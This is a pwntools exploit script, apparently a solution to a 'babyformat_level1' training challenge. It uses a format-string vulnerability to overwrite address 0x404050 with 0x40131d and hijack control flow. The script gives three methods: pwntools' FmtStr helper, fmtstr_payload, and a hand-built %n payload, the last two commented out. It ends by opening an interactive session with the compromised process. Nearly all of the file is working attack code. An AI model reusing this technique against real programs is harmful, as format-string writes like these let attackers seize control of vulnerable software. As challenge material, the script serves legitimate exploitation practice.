#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./babyformat_level1
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '/challenge/babyformat_level1')
context.terminal = ["tmux", "splitw", "-h"]
# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

# shellcode = asm(shellcraft.sh())
# payload = fit({
#     32: 0xdeadbeef,
#     'iaaa': [1, 2, 'Hello', 3]
# }, length=128)
# io.send(payload)
# flag = io.recv(...)
# log.success(flag)

# method1
def send_fmt_payload(payload):
     print(repr(payload))
     io.sendline(payload)
     return io.recv()

f = FmtStr(send_fmt_payload, offset=12,padlen=0, numbwritten=0)
f.write(0x404050, 0x40131d)
f.execute_writes()


# method2
# win_add = int('0x404050',16)
# val = int('0x40131d',16)
# win2 = 0x404050
# writes = {win2:val}

# # why 12$ positional argument, not 14$  - I guess payload string considering       
# payload = fmtstr_payload(12, writes) #  not sigsegv [3,12] 12$ - got pwn
# print(payload)
# io.sendline(payload)

#method 3
# buf = b"%04199197d%14$ln" + p64(0x404050)
# io.recvuntil(b"triggering the vulnerability:")
# io.sendline(buf)

io.interactive()

